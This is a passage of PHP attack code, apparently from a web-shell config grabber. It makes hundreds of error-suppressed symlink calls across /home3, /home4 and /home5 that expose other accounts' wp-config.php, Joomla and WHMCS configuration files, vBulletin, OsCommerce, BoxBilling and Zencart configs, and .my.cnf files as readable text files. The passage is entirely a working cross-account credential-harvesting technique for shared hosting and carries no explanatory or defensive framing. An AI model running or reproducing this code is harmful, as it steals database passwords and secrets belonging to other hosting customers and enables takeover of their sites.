@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home3/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home4/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home5

@symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home5/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home5/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
